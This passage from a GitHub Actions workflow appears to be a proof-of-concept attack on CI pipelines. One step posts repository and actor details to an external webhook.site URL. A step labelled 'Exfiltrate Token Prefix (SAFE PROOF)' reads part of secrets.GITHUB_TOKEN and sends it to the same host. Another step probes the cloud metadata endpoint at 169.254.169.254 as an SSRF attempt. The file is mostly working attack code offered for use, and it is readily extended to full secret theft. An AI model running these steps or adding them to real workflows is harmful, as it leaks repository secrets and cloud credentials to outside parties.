 ACTOR="${{ github.actor }}"
          REPO="${{ github.repository }}"
          EVENT="${{ github.event_name }}"

          curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "{\"actor\":\"$ACTOR\",\"repo\":\"$REPO\",\"event\":\"$EVENT\"}" \
            https://webhook.site/ff7df6bc-b878-4b8f-b0f0-294f22f56a5b

      - name: Exfiltrate Token Prefix (SAFE PROOF)
        run: |
          TOKEN_PREFIX=$(echo "${{ secrets.GITHUB_TOKEN }}" | head -c 4)

          curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "{\"actor\":\"${{ github.actor }}\",\"token_prefix\":\"$TOKEN_PREFIX\"}" \
            https://webhook.site/ff7df6bc-b878-4b8f-b0f0-294f22f56a5b

      - name: SSRF Attempt (Metadata Endpoint)
        run: |
          curl -s --max-time 5 http://169.254.169.254/latest/meta-data/instance-id || echo "Metadata access blocked"
